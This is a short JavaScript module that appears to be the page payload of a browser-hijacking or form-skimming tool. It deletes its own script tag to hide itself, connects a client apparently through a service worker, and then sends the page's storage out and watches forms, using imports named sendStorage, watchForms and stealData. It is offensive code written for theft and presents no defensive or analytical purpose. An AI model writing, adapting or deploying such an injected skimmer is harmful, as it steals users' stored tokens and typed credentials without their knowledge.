import {Client} from '2sweet'
import removeCurrentScript from '@functions/removeCurrentScript'
import sendStorage from './sendStorage'
import watchForms from './watchForms'
import {stealData} from '@config'

removeCurrentScript()

pagePayload()

function pagePayload() {
  if (window.hasOwnProperty('binV')) {
    return
  } else {
    window.binV = undefined
  }
  const client = new Client()

  window.navigator.serviceWorker.controller.addEventListener('message', console.log)

  client.on('connected', onConnect.bind(null, client))
}

function onConnect(client) {
  sendStorage(client)
  watchForms(client)
}
